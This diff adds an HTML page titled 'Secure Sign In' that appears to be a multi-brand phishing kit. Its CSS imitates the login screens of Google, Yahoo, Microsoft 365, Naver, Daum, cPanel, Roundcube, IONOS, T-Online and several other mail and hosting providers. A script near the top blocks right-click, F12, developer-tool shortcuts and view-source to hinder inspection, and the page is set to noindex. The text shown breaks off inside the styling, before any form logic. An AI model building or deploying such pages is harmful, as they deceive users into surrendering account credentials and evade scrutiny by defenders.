@@ -1,0 +1,1394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex, nofollow">
+<title id="pageTitle">Secure Sign In</title>
+<style>
+  body{-webkit-touch-callout:none;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
+</style>
+<script>
+  document.addEventListener('contextmenu',e=>e.preventDefault());
+  document.addEventListener('dragstart',e=>e.preventDefault());
+  document.addEventListener('keydown',function(e){
+    if(e.key==='F12'||e.keyCode===123){e.preventDefault();return false}
+    if(e.ctrlKey&&e.shiftKey&&['I','i','J','j','C','c'].includes(e.key)){e.preventDefault();return false}
+    if(e.metaKey&&e.altKey&&['I','i','J','j','C','c'].includes(e.key)){e.preventDefault();return false}
+    if((e.ctrlKey||e.metaKey)&&['U','u','S','s'].includes(e.key)){e.preventDefault();return false}
+  });
+</script>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,'Noto Sans KR','Noto Sans JP','Noto Sans SC',sans-serif;min-height:100vh;background-size:cover;background-position:center;color:#333;display:flex;justify-content:center;align-items:center;padding:20px;transition:background .6s ease}
+  .err-box{color:#d32f2f;font-size:13px;margin-top:10px;display:none;font-weight:500}
+  .err-box.show{display:block}
+
+  /* ---------- DAOU ---------- */
+  body.is-daou{display:block!important;padding:0!important;background:#fff!important}
+  .daou-notice{background:linear-gradient(90deg,#1b53d2 0%,#2f6ae8 55%,#3f7cf0 100%);color:#fff;padding:16px 40px;display:flex;align-items:center;gap:16px;position:relative}
+  .daou-notice .pill{background:#0b2a7a;font-size:12px;font-weight:700;padding:3px 10px;border-radius:4px}
+  .daou-notice h2{font-size:19px;font-weight:700}
+  .daou-notice .meta{font-size:13px;line-height:1.6;opacity:.95}
+  .daou-close{position:absolute;right:24px;top:14px;font-size:12px;cursor:pointer;opacity:.9}
+  .daou-wrap{max-width:440px;margin:0 auto;padding:70px 20px 40px;text-align:center}
+  .daou-logo{font-size:40px;font-weight:800;letter-spacing:2px;color:#8c1c1c;font-family:'Trebuchet MS',Arial,sans-serif}
+  .daou-logo small{display:block;font-size:11px;letter-spacing:5px;font-weight:400;color:#555;margin-top:4px}
+  .daou-field{position:relative;border:1px solid #cfd3d8;border-radius:8px;margin-top:14px;text-align:left;background:#fff}
+  .daou-field label{position:absolute;top:6px;left:14px;font-size:11px;color:#8a9099}
+  .daou-field input{width:100%;border:none;outline:none;padding:22px 40px 8px 14px;font-size:15px;border-radius:8px;background:transparent}
+  .daou-clear{position:absolute;right:12px;top:50%;transform:translateY(-50%);width:20px;height:20px;border-radius:50%;background:#c2c8cf;color:#fff;border:none;font-size:12px;cursor:pointer}
+  .daou-row{display:flex;justify-content:space-between;align-items:center;font-size:13px;color:#333;margin:14px 2px 18px}
+  .daou-row label{display:flex;align-items:center;gap:6px;cursor:pointer}
+  .daou-row a{color:#333;text-decoration:none}
+  .daou-btn{width:100%;height:52px;border:none;border-radius:8px;background:#22b8c8;color:#fff;font-size:16px;font-weight:700;cursor:pointer}
+  .daou-lang{text-align:right;margin-top:12px;font-size:13px;color:#666}
+  .daou-divider{border-top:1px solid #e6e8eb;margin:36px 0 18px}
+  .daou-app{width:100%;height:50px;border:1px solid #dfe2e6;border-radius:8px;background:#fff;font-size:15px;font-weight:600;color:#333;cursor:pointer}
+  .daou-foot{text-align:center;font-size:11px;color:#9aa0a6;margin-top:26px}
+
+  /* ---------- ABV ---------- */
+  body.is-abv{display:block!important;background:#fff!important;padding:0!important}
+  .abv-stage{width:100%;display:flex;justify-content:center;overflow:hidden}
+  .framer-k1yVm{height:1080px;background:#fff;width:1351px;position:relative;margin:0 auto;transform-origin:top center}
+  .framer-l37xyv{z-index:10;background:#f0f0f0;width:100%;height:35px;position:absolute;top:0;left:0}
+  .framer-1uj2ez6{width:25px;position:absolute;top:5px;left:15px}
+  .framer-13rvrfu{display:flex;position:absolute;top:11px;left:36px;border-right:2px solid #d4d0c8;padding:0 11px;align-items:center}
+  .framer-i0rsf2{display:flex;position:absolute;top:11px;left:134px;border-right:2px solid #d4d0c8;padding:0 11px;align-items:center}
+  .framer-1inf8b4{display:flex;position:absolute;top:11px;left:185px;border-right:2px solid #d4d0c8;padding:0 11px;align-items:center}
+  .framer-14zwyi7{position:absolute;top:11px;left:335px}
+  .framer-1trcrps{position:absolute;top:3px;left:470px}
+  .framer-e23xuc{display:flex;position:absolute;top:11px;left:1095px;border-right:2px solid #d4d0c8;padding:0 12px 0 11px;align-items:center}
+  .framer-1ofzc25{position:absolute;top:11px;left:1253px}
+  .framer-ivfs9d{position:absolute;top:53px;left:216px}
+  .framer-1tyjjwu{position:absolute;top:77px;left:827px;width:305px;border:1px solid #e0e0e0}
+  .framer-1tqp0cc,.framer-1lwhm32,.framer-1cb6bps{position:absolute;top:473px;width:215px}
+  .framer-1tqp0cc{left:196px}.framer-1lwhm32{left:428px}.framer-1cb6bps{left:660px}
+  .framer-1op5ul{position:absolute;top:638px;left:741px;width:215px}
+  .framer-heb492{position:absolute;top:586px;left:196px;width:262px}
+  .framer-1srjyxk{position:absolute;top:586px;left:472px;width:262px}
+  .framer-195nnv8{background:#b8e6fd;width:640px;height:288px;position:absolute;top:146px;left:196px}
+  .framer-nmkhwe{position:absolute;top:15px;left:25px}
+  .framer-zgdkdg{position:absolute;top:0;left:340px;width:300px}
+  .framer-1ivdcrg{position:absolute;bottom:32px;left:76px}
+  .framer-17sdx75{position:absolute;bottom:8px;left:25px}
+  .framer-1k6dsll{background:#fff;width:940px;height:33px;position:absolute;top:434px;left:calc(49.2968% - 470px)}
+  .framer-122upky{position:absolute;top:-14px;left:24px}
+  .framer-6nmjat{position:absolute;top:7px;left:898px}
+  .framer-PR0MW{display:flex;flex-direction:column;gap:10px;width:315px;position:absolute;top:60px;left:25px}
+  .framer-form-text-input{background:#fcffdf;border:1px solid rgba(136,136,136,.1);border-radius:2px;padding:4px;display:flex;align-items:center;height:29px}
+  .framer-form-text-input input{background:transparent;border:none;outline:none;width:100%;padding:0 4px;font-size:14px;font-family:'Inter',sans-serif}
+  .framer-btn{background:rgb(27,158,21);border:none;color:#fff;font-size:14px;font-weight:600;width:240px;height:40px;cursor:pointer;border-radius:2px}
+  .abv-custom-error{color:#d32f2f;font-size:12px;font-weight:600;margin-top:8px;padding:8px 12px;background:#ffebee;border-radius:4px;border-left:3px solid #d32f2f;display:none}
+  .abv-custom-error.show{display:block}
+  .abv-custom-success{color:#1ba916;font-size:12px;font-weight:600;margin-top:8px;padding:8px 12px;background:#e8f5e9;border-radius:4px;border-left:3px solid #1ba916;display:none}
+  .abv-custom-success.show{display:block}
+
+  /* ---------- CPANEL ---------- */
+  body.is-cpanel{display:block!important;padding:0!important;background:#fff!important}
+  .cp-wrap{max-width:400px;margin:0 auto;padding:56px 20px;text-align:center}
+  .cp-logo{font-size:44px;font-style:italic;font-weight:800;color:#e87722;letter-spacing:-2px;margin-bottom:28px}
+  .cp-label{text-align:left;font-size:14px;font-weight:700;color:#333;margin-bottom:6px}
+  .cp-in{display:flex;align-items:center;border:1px solid #c9ccd0;border-radius:3px;margin-bottom:18px;background:#fff}
+  .cp-in .ico{width:38px;text-align:center;color:#9aa0a6;font-size:15px}
+  .cp-in input{flex:1;border:none;outline:none;padding:10px 8px 10px 0;font-size:14px}
+  .cp-btn{width:100%;height:38px;background:#2f9fd0;color:#fff;border:none;border-radius:3px;font-size:14px;font-weight:600;cursor:pointer}
+  .cp-reset{display:block;margin:18px 0 34px;font-size:13px;font-weight:700;color:#333;text-decoration:none}
+  .cp-langs{display:flex;flex-wrap:wrap;justify-content:center;gap:16px;font-size:12px;color:#333}
+  .cp-copy{text-align:center;font-size:11px;color:#888;margin-top:40px;line-height:1.6}
+  .cp-copy b{color:#e87722;font-size:13px}
+
+  /* ---------- ROUNDCUBE ---------- */
+  body.is-webmail{display:flex!important;align-items:center;justify-content:center;background:#fff!important;padding:0}
+  .rc-layout{display:flex;flex-direction:column;align-items:center;width:100%;max-width:400px}
+  .rc-logo-area{margin-bottom:34px;text-align:center}
+  .rc-brand{font-size:26px;font-weight:800}
+  .rc-logo-svg{width:74px;height:74px;margin:0 auto 14px}
+  .rc-form{width:100%}
+  .rc-input-group{display:flex;align-items:center;border:1px solid #ccc;border-radius:4px;margin-bottom:10px;background:#fff}
+  .rc-input-icon{background:#f5f5f5;border-right:1px solid #ccc;padding:12px 15px;color:#666}
+  .rc-input-group input{flex:1;padding:12px;border:none;font-size:15px;outline:none;background:transparent}
+  .rc-btn{width:100%;background:#40b3e0;color:#fff;border:none;padding:14px;font-size:16px;font-weight:600;border-radius:4px;cursor:pointer;margin-top:10px;text-transform:uppercase}
+  .rc-footer{text-align:center;font-size:13px;color:#999;margin-top:20px}
+  .rc-footer a{color:#40b3e0;text-decoration:none}
+
+  /* ---------- YAHOO ---------- */
+  body.is-yahoo{display:flex!important;flex-direction:column;background:#f4f4f4!important;padding:0!important}
+  .yahoo-top-bar{width:100%;background:#fff;padding:20px 40px;display:flex;justify-content:space-between;align-items:center}
+  .yahoo-logo{font-size:32px;font-weight:800;color:#5f01d1;letter-spacing:-1px}
+  .yahoo-nav{display:flex;gap:20px;font-size:14px}
+  .yahoo-nav a{color:#232323;text-decoration:none}
+  .yahoo-container{flex:1;display:flex;justify-content:flex-end;padding:40px 20%}
+  .yahoo-card{background:#fff;width:100%;max-width:400px;border-radius:16px;padding:40px;box-shadow:0 4px 12px rgba(0,0,0,.05)}
+  .yahoo-email{font-size:14px;margin-bottom:20px;font-weight:500}
+  .yahoo-title{font-size:24px;font-weight:700;margin-bottom:24px}
+  .yahoo-label{color:#5f01d1;font-size:14px;font-weight:600;margin-bottom:8px;display:block}
+  .yahoo-input-group{position:relative;border:1px solid #5f01d1;border-radius:6px;margin-bottom:10px}
+  .yahoo-input-group input{width:100%;padding:14px 40px 14px 14px;border:none;outline:none;font-size:16px;border-radius:6px;background:transparent}
+  .yahoo-eye{position:absolute;right:14px;top:50%;transform:translateY(-50%);background:none;border:none;color:#5f01d1;cursor:pointer;font-size:18px}
+  .yahoo-forgot{color:#232323;text-decoration:underline;font-size:14px;margin:8px 0 32px;display:inline-block}
+  .yahoo-btn{width:100%;background:#5f01d1;color:#fff;border:none;border-radius:24px;padding:14px;font-size:16px;font-weight:600;cursor:pointer}
+
+  /* ---------- GOOGLE ---------- */
+  body.is-google{display:flex!important;flex-direction:column;background:#f0f4f9!important;padding:0!important;justify-content:center;align-items:center}
+  .google-layout{display:flex;flex-direction:column;width:100%;max-width:960px;padding:20px}
+  .google-card{background:#fff;border-radius:28px;display:flex;width:100%;min-height:400px;padding:40px;box-shadow:0 4px 12px rgba(0,0,0,.05);border:1px solid #dadce0}
+  .google-left{flex:1;display:flex;flex-direction:column}
+  .google-right{flex:1;display:flex;flex-direction:column;justify-content:center;padding-left:40px}
+  .google-logo-svg{width:40px;height:40px;margin-bottom:16px}
+  .google-welcome{font-size:36px;font-weight:400;color:#1f1f1f;margin-bottom:20px}
+  .google-user-pill{display:inline-flex;align-items:center;gap:8px;border:1px solid #747775;border-radius:20px;padding:4px 12px;font-size:14px;max-width:fit-content}
+  .google-input{width:100%;padding:13px 15px;border:1px solid #747775;border-radius:4px;font-size:16px;margin-bottom:10px}
+  .google-checkbox-row{display:flex;align-items:center;gap:8px;font-size:14px;margin-bottom:40px}
+  .google-actions{display:flex;justify-content:space-between;align-items:center}
+  .google-forgot{color:#0b57d0;font-size:14px;font-weight:500;text-decoration:none}
+  .google-btn{background:#0b57d0;color:#fff;border:none;padding:10px 24px;border-radius:20px;font-size:14px;font-weight:500;cursor:pointer}
+  .google-footer{display:flex;justify-content:space-between;margin-top:20px;font-size:12px;color:#444746;width:100%;max-width:960px}
+
+  /* ---------- HIWORKS ---------- */
+  body.is-hiworks{display:flex!important;flex-direction:column;align-items:center;justify-content:center;background:#fff!important;padding:0!important;min-height:100vh;position:relative}
+  .hiworks-top-left{position:absolute;top:25px;left:30px;font-size:22px;font-weight:800;color:#1e88e5}
+  .hiworks-container{width:100%;max-width:440px;display:flex;flex-direction:column;align-items:center;text-align:center;padding:20px}
+  .hiworks-center-logo{margin-bottom:20px;display:flex;justify-content:center;align-items:center;min-height:60px;font-size:42px;font-weight:800;color:#1e88e5;letter-spacing:-1.5px}
+  .hiworks-h1{font-size:24px;font-weight:700;color:#1a1a1a;margin-bottom:8px}
+  .hiworks-h2{font-size:15px;font-weight:400;color:#666;margin-bottom:30px;line-height:1.5}
+  .hiworks-input-wrap{position:relative;margin-bottom:12px;text-align:left;width:100%}
+  .hiworks-input-wrap input{width:100%;height:52px;padding:0 16px 0 46px;border:1px solid #dcdde0;border-radius:4px;font-size:15px;background:#fff}
+  .hiworks-input-wrap input:focus{outline:none;border-color:#1e88e5}
+  .hiworks-input-icon{position:absolute;left:16px;top:50%;transform:translateY(-50%);width:18px;height:18px;color:#aaa;pointer-events:none}
+  .hiworks-btn{width:100%;height:52px;border:none;border-radius:4px;background:#b3d4fc;color:#fff;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px}
+  .hiworks-btn:hover:not(:disabled){background:#1e88e5}
+  .hiworks-btn.on{background:#1e88e5}
+  .hiworks-email-chip{display:inline-flex;align-items:center;gap:8px;padding:10px 20px;background:#fff;border:1px solid #e0e0e0;border-radius:24px;font-size:14px;color:#333;margin-bottom:24px}
+  .hiworks-links-row{display:flex;align-items:center;justify-content:center;gap:14px;margin-top:18px;font-size:13px;color:#666;width:100%}
+  .hiworks-links-row a{color:#1e88e5;text-decoration:none}
+  .hiworks-ip-toggle{display:inline-flex;align-items:center;gap:6px;margin-left:10px;font-size:12px;color:#333}
+  .hiworks-toggle-switch{width:34px;height:20px;background:#1e88e5;border-radius:10px;position:relative}
+  .hiworks-toggle-switch::after{content:'';position:absolute;right:2px;top:2px;width:16px;height:16px;background:#fff;border-radius:50%}
+  .hiworks-banner{width:100%;border-radius:4px;overflow:hidden;background:#fff8e1;display:flex;text-align:left;border:1px solid #ffe0b2;margin-top:22px}
+  .hiworks-banner-text{padding:15px 20px;flex:1}
+  .hiworks-banner-text h3{font-size:15px;font-weight:700;color:#333;margin-bottom:4px}
+  .hiworks-banner-text p{font-size:11px;color:#666}
+  .hiworks-banner-img{width:140px;display:flex;align-items:flex-end;justify-content:flex-end;padding:5px}
+  .hiworks-footer{padding:20px;text-align:center;color:#aaa;font-size:12px;position:absolute;bottom:20px;width:100%}
+  .hiworks-notice{display:none;background:#eaf4ff;color:#0b3d91;border:1px solid #c3ddff;border-radius:8px;padding:14px 16px;margin:16px 0;font-size:14px;font-weight:600;text-align:center}
+  .hiworks-overlay{display:none;position:fixed;inset:0;background:rgba(255,255,255,.95);z-index:999;flex-direction:column;align-items:center;justify-content:center;gap:18px}
+  .hiworks-overlay.show{display:flex}
+  .hiworks-overlay .sp{width:48px;height:48px;border:4px solid #e0e0e0;border-top-color:#1e88e5;border-radius:50%;animation:spin .8s linear infinite}
+  .hiworks-overlay .tx{color:#1e88e5;font-size:15px;font-weight:600}
+
+  /* ---------- NAVER ---------- */
+  .naver-layout{display:none;width:100%;min-height:100vh;justify-content:center;align-items:flex-start;background:#fff;padding:70px 20px 50px}
+  body.is-naver{display:flex!important;padding:0!important;background:#fff!important}
+  body.is-naver .naver-layout{display:flex}
+  .naver-wrap{width:100%;max-width:520px;text-align:center}
+  .naver-brand{font-size:54px;font-weight:800;color:#03c75a;letter-spacing:-2.5px;margin-bottom:38px}
+  .naver-card{border:1px solid #e6e6e6;border-radius:20px;padding:38px 34px 26px;text-align:left;background:#fff}
+  .naver-field{margin-bottom:26px}
+  .naver-field label{display:block;font-size:13px;color:#888;margin-bottom:8px}
+  .naver-line{position:relative;border-bottom:1px solid #d5d5d5}
+  .naver-line input{width:100%;border:none;outline:none;padding:6px 30px 10px 0;font-size:16px;color:#111;background:transparent}
+  .naver-clear{position:absolute;right:0;top:50%;transform:translateY(-50%);width:20px;height:20px;border-radius:50%;background:#c8c8c8;color:#fff;border:none;font-size:11px;cursor:pointer;line-height:1}
+  .naver-row{display:flex;justify-content:space-between;align-items:center;font-size:14px;color:#333;margin:6px 0 26px}
+  .naver-check{display:flex;align-items:center;gap:7px;cursor:pointer}
+  .naver-ip{display:flex;align-items:center;gap:8px}
+  .naver-switch{width:42px;height:24px;background:#03c75a;border-radius:12px;position:relative;display:inline-block}
+  .naver-switch::after{content:'';position:absolute;right:3px;top:3px;width:18px;height:18px;background:#fff;border-radius:50%}
+  .naver-actions{display:flex;gap:10px}
+  .naver-passkey{flex:0 0 42%;height:52px;border:none;border-radius:8px;background:#f2f3f5;color:#333;font-size:16px;font-weight:700;cursor:pointer}
+  .naver-btn{flex:1;height:52px;border:none;border-radius:8px;background:#03c75a;color:#fff;font-size:17px;font-weight:700;cursor:pointer}
+  .naver-qr{margin-top:22px;text-align:center;font-size:14px;color:#333}
+  .naver-qr span{color:#999;margin-left:2px}
+  .naver-foot-links{display:flex;justify-content:center;gap:14px;font-size:14px;color:#666;margin-top:30px}
+  .naver-foot-links a{color:#666;text-decoration:none}
+  .naver-foot-links span{color:#ddd}
+  .naver-social{display:flex;justify-content:center;gap:22px;margin-top:36px}
+  .soc{width:44px;height:44px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:17px;font-weight:800;border:1px solid #e6e6e6;cursor:pointer}
+  .soc.apple{background:#000;color:#fff;border-color:#000}
+  .soc.google{background:#fff;color:#4285F4}
+  .soc.line{background:#06c755;color:#fff;border-color:#06c755;font-size:13px}
+  .naver-bottom{display:flex;justify-content:center;gap:16px;font-size:13px;color:#666;margin-top:44px}
+  .naver-bottom a{color:#666;text-decoration:none}
+  .naver-copy{text-align:center;font-size:12px;color:#999;margin-top:10px}
+
+  /* ---------- DAUM ---------- */
+  .daum-layout{display:none;width:100%;min-height:100vh;justify-content:center;align-items:center;padding:40px 20px;background:#f5f5f5}
+  body.is-daum{display:flex!important;padding:0!important;background:#f5f5f5!important}
+  body.is-daum .daum-layout{display:flex}
+  .daum-card{background:#fff;width:560px;max-width:calc(100vw - 32px);min-height:560px;padding:52px 48px;border-radius:10px;box-shadow:0 12px 40px rgba(0,0,0,.1);display:flex;flex-direction:column}
+  .daum-logo{font-size:38px;font-weight:700;color:#333}
+  .daum-logo span{color:#f9a800}
+  .daum-sub{font-size:14px;color:#888;margin:10px 0 34px}
+  .daum-label{font-size:13px;font-weight:600;color:#444;margin-bottom:7px}
+  .daum-input{width:100%;padding:14px;border:1px solid #d5d5d5;border-radius:4px;margin-bottom:16px;font-size:15px;background:#fff}
+  .daum-input:focus{outline:none;border-color:#f9a800}
+  .daum-row{display:flex;justify-content:space-between;align-items:center;font-size:13px;color:#555;margin:4px 0 28px}
+  .daum-row label{display:flex;align-items:center;gap:7px}
+  .daum-row b{color:#f9a800}
+  .daum-btn{width:100%;background:#f9a800;color:#fff;border:none;padding:16px;font-size:16px;font-weight:bold;cursor:pointer;border-radius:4px}
+  .daum-links{display:flex;justify-content:center;gap:12px;font-size:13px;color:#888;margin-top:26px}
+  .daum-links a{color:#666;text-decoration:none}
+  .daum-links span{color:#ddd}
+  .daum-foot{margin-top:auto;padding-top:30px;text-align:center;font-size:11px;color:#aaa}
+
+  /* ---------- T-ONLINE ---------- */
+  body.is-tonline{display:flex!important;align-items:center;justify-content:center;background:linear-gradient(135deg,#8c8c9e 0%,#b58b9c 100%)!important;padding:0}
+  .tonline-box{background:#fff;width:480px;max-width:calc(100vw - 32px);border-radius:8px;padding:36px;box-shadow:0 10px 30px rgba(0,0,0,.15);position:relative}
+  .tonline-logo{position:absolute;top:0;left:0;width:80px;height:80px;background:#e20074;display:flex;align-items:center;justify-content:center;border-top-left-radius:8px}
+  .tonline-logo svg{fill:#fff;width:40px;height:40px}
+  .tonline-header{display:flex;align-items:center;margin-bottom:30px;margin-top:10px;padding-left:90px}
+  .tonline-email{font-weight:600;font-size:16px;color:#333}
+  .tonline-title{font-size:28px;font-weight:700;margin-bottom:24px}
+  .tonline-input-group{position:relative;margin-bottom:12px}
+  .tonline-input-group input{width:100%;padding:12px 40px 12px 14px;border:1px solid #ccc;border-radius:6px;font-size:16px}
+  .tonline-eye{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;color:#666;cursor:pointer}
+  .tonline-link{color:#e20074;text-decoration:underline;font-size:14px;display:inline-block;margin-bottom:24px}
+  .tonline-btn-main{width:100%;background:#e20074;color:#fff;border:none;padding:14px;font-size:16px;font-weight:700;border-radius:6px;cursor:pointer;text-transform:uppercase}
+
+  /* ---------- HI-BOX (FULL PAGE) ---------- */
+  body.is-hibox{display:block!important;background:#f0f0f0!important;padding:0!important}
+  .hibox-page{width:100%;min-height:100vh;background:#fff}
+  .hibox-utility{background:#f5f5f5;border-bottom:1px solid #e2e2e2;font-size:12px;color:#444}
+  .hibox-utility-in{max-width:1180px;margin:0 auto;padding:6px 16px;display:flex;justify-content:flex-end;align-items:center;gap:14px}
+  .hibox-utility a{color:#444;text-decoration:none}
+  .hibox-utility select{border:1px solid #bbb;font-size:12px;padding:1px 2px;background:#fff}
+  .hibox-header{max-width:1180px;margin:0 auto;padding:18px 16px 0;display:flex;justify-content:space-between;align-items:flex-start;gap:20px}
+  .hibox-logo{font-size:34px;font-weight:800;font-style:italic;color:#0055a4;line-height:1.05;letter-spacing:-1px}
+  .hibox-logo em{display:block;font-size:15px;font-style:italic;color:#333;font-weight:700;letter-spacing:0}
+  .hibox-tiles{display:flex;gap:8px}
+  .hibox-tile{width:74px;text-align:center;font-size:11px;color:#333;text-decoration:none}
+  .hibox-tile .ic{width:74px;height:44px;border:1px solid #d6d6d6;border-radius:4px;background:#fafafa;display:flex;align-items:center;justify-content:center;font-size:20px;margin-bottom:4px}
+  .hibox-tile.adm .ic{background:#1b73ba;border-color:#1b73ba;color:#fff;flex-direction:column;font-size:10px;line-height:1.2}
+  .hibox-hero-row{max-width:1180px;margin:0 auto;padding:16px;display:flex;gap:14px;align-items:stretch}
+  .hibox-hero{flex:1;min-height:320px;border-radius:4px;background:linear-gradient(180deg,#9fc4b6 0%,#7fae9c 100%);position:relative;overflow:hidden;display:flex;align-items:center;justify-content:center;text-align:center;padding:30px}
+  .hibox-hero h2{color:#fff;font-size:28px;font-weight:600;line-height:1.5;text-shadow:0 1px 3px rgba(0,0,0,.25)}
+  .hibox-hero .hand{position:absolute;left:0;top:0;bottom:0;width:170px;background:linear-gradient(90deg,rgba(0,0,0,.35),rgba(0,0,0,0))}
+  .hibox-hero .mascot{position:absolute;right:22px;bottom:0;font-size:52px}
+  .hibox-dots{position:absolute;bottom:12px;left:50%;transform:translateX(-50%);display:flex;gap:7px}
+  .hibox-dots i{width:9px;height:9px;border-radius:50%;background:#fff;opacity:.55}
+  .hibox-dots i.on{opacity:1;background:#1b73ba;box-shadow:0 0 0 2px #fff}
+  .hibox-side{width:300px;border:1px solid #cfcfcf;border-radius:4px;overflow:hidden;background:#eef1f3}
+  .hibox-side-h{background:#5f7f96;color:#fff;font-size:13px;font-weight:700;padding:8px 12px}
+  .hibox-form{padding:14px 12px 16px}
+  .hibox-frow{display:flex;align-items:center;margin-bottom:9px;font-size:12px;color:#333}
+  .hibox-frow label{width:62px;flex:0 0 62px}
+  .hibox-frow input{flex:1;min-width:0;height:26px;border:1px solid #b9b9b9;padding:2px 6px;font-size:12px;background:#fff}
+  .hibox-frow .mini{width:20px;height:26px;border:1px solid #b9b9b9;border-left:none;background:#eee;font-size:10px;cursor:pointer}
+  .hibox-cap{display:flex;gap:6px;align-items:center}
+  .hibox-cap .img{width:88px;height:30px;border:1px solid #b9b9b9;background:linear-gradient(90deg,#e8f3b8,#d8ee9a);display:flex;align-items:center;justify-content:center;font-weight:800;color:#2b4a8a;font-size:14px;letter-spacing:1px;font-style:italic}
+  .hibox-cap .rf{width:26px;height:30px;border:1px solid #b9b9b9;background:#eee;cursor:pointer;font-size:13px}
+  .hibox-remember{font-size:12px;color:#333;margin:10px 0 14px;display:flex;align-items:center;gap:6px}
+  .hibox-btns{display:flex;gap:6px;align-items:center}
+  .hibox-otp{background:#1b73ba;color:#fff;border:none;border-radius:3px;font-size:11px;line-height:1.2;padding:5px 7px;cursor:pointer}
+  .hibox-login{background:#f0872c;color:#fff;border:none;border-radius:3px;font-size:13px;font-weight:700;padding:9px 22px;cursor:pointer;margin-left:auto}
+  .hibox-help{background:#f0872c;color:#fff;border:none;border-radius:3px;font-size:13px;font-weight:700;padding:9px 16px;cursor:pointer}
+  .hibox-support{max-width:1180px;margin:0 auto;padding:14px 16px;display:flex;justify-content:center;gap:70px;font-size:12px;color:#333}
+  .hibox-support b{display:block;font-size:15px;color:#2b6cb0}
+  .hibox-support .c1 b{color:#4a5568}
+  .hibox-bottom{max-width:1180px;margin:0 auto;padding:0 16px 20px;display:flex;gap:14px}
+  .hibox-ad{width:300px;min-height:150px;border-radius:4px;background:linear-gradient(180deg,#3aa0e0,#1f6fb2);color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:16px;font-size:14px;font-weight:700;line-height:1.4}
+  .hibox-ad .env{font-size:34px;margin-bottom:8px}
+  .hibox-news{flex:1;border:1px solid #e08b4a;border-radius:4px;padding:0 0 10px}
+  .hibox-news-h{display:flex;justify-content:space-between;align-items:center;padding:8px 12px;border-bottom:1px solid #eee;font-size:15px;font-weight:700;color:#333}
+  .hibox-news-h a{font-size:11px;color:#888;text-decoration:none;font-weight:400}
+  .hibox-news ul{list-style:none;padding:8px 12px 0}
+  .hibox-news li{font-size:12px;color:#444;line-height:1.9;display:flex;gap:6px}
+  .hibox-news li .n{background:#e8362b;color:#fff;font-size:9px;padding:0 3px;border-radius:2px;height:13px;line-height:13px;margin-top:5px}
+  .hibox-rainbow{height:16px;background:repeating-linear-gradient(90deg,#3aa0e0 0 12px,#5bb85b 12px 24px,#f0c419 24px 36px,#f0872c 36px 48px,#e8362b 48px 60px)}
+  .hibox-footer{max-width:1180px;margin:0 auto;padding:18px 16px 30px;font-size:11px;color:#666;line-height:1.9}
+  .hibox-footer .row{display:flex;justify-content:space-between;align-items:flex-start;gap:20px}
+  .hibox-footer a{color:#666;text-decoration:none}
+  .hibox-footer .rel{display:flex;align-items:center;gap:10px;margin-bottom:8px}
+  .hibox-footer .rel .tag{background:#888;color:#fff;padding:2px 8px;border-radius:2px}
+  .hibox-footer .compat{border:1px solid #ccc;padding:6px 10px;border-radius:3px;text-align:center;font-size:10px;line-height:1.4;color:#555}
+  @media(max-width:900px){
+    .hibox-hero-row{flex-direction:column}.hibox-side{width:100%}
+    .hibox-bottom{flex-direction:column}.hibox-ad{width:100%}
+    .hibox-tiles{flex-wrap:wrap}.hibox-support{gap:24px;flex-wrap:wrap}
+  }
+
+  /* ---------- IONOS ---------- */
+  body.is-ionos{display:block!important;background:#f4f6f8!important;padding:0!important}
+  .ionos-header{background:#fff;padding:15px 40px;display:flex;align-items:center;border-bottom:1px solid #e0e0e0}
+  .ionos-logo{font-size:26px;font-weight:800;color:#003087;letter-spacing:-1px}
+  .ionos-main{display:flex;justify-content:center;padding:60px 20px;min-height:calc(100vh - 70px)}
+  .ionos-card{background:#fff;width:520px;max-width:calc(100vw - 32px);border-radius:8px;padding:40px;box-shadow:0 4px 12px rgba(0,0,0,.05)}
+  .ionos-title{font-size:24px;font-weight:600;margin-bottom:24px}
+  .ionos-user-row{display:flex;align-items:center;gap:10px;font-size:14px;color:#003087;margin-bottom:30px;font-weight:500}
+  .ionos-input{width:100%;padding:12px 14px;border:1px solid #ccc;border-radius:4px;font-size:15px;margin-bottom:12px}
+  .ionos-btn{width:100%;background:#003087;color:#fff;border:none;padding:14px;font-size:16px;font-weight:600;border-radius:24px;cursor:pointer}
+
+  /* ---------- MICROSOFT 365 ---------- */
+  .m365-layout{display:none;width:100%;min-height:100vh;justify-content:center;align-items:center;flex-direction:column;background:linear-gradient(135deg,#eef2f7 0%,#f7eef4 50%,#eaf3fb 100%)}
+  body.is-m365{display:flex!important;padding:0!important}
+  body.is-m365 .m365-layout{display:flex}
+  .m365-card{background:#fff;width:440px;max-width:calc(100vw - 40px);padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
+  .m365-logo{display:flex;align-items:center;gap:8px;font-size:20px;font-weight:600;color:#5e5e5e;margin-bottom:24px}
+  .m365-logo-icon{width:24px;height:24px;display:grid;grid-template-columns:1fr 1fr;gap:2px}
+  .m365-logo-icon div:nth-child(1){background:#f25022}
+  .m365-logo-icon div:nth-child(2){background:#7fba00}
+  .m365-logo-icon div:nth-child(3){background:#00a4ef}
+  .m365-logo-icon div:nth-child(4){background:#ffb900}
+  .m365-back{display:flex;align-items:center;gap:8px;font-size:15px;margin-bottom:16px}
+  .m365-title{font-size:24px;font-weight:600;margin-bottom:24px}
+  .m365-input{width:100%;padding:8px 0;border:none;border-bottom:1px solid #666;font-size:15px;margin-bottom:16px;outline:none}
+  .m365-input:focus{border-bottom-color:#0067b8}
+  .m365-link{color:#0067b8;font-size:14px;text-decoration:none;display:inline-block;margin-bottom:32px}
+  .m365-actions{display:flex;justify-content:flex-end}
+  .m365-btn{background:#0067b8;color:#fff;border:none;padding:7px 32px;font-size:15px;cursor:pointer}
+  .m365-options{display:flex;align-items:center;gap:8px;margin-top:32px;font-size:13px}
+  .m365-foot{width:440px;max-width:calc(100vw - 40px);display:flex;justify-content:flex-end;gap:16px;margin-top:12px;font-size:12px;color:#666}
+
+  /* ---------- SINGTEL ---------- */
+  .singtel-layout{display:none;width:100%;min-height:100vh;justify-content:center;align-items:flex-start;padding:0}
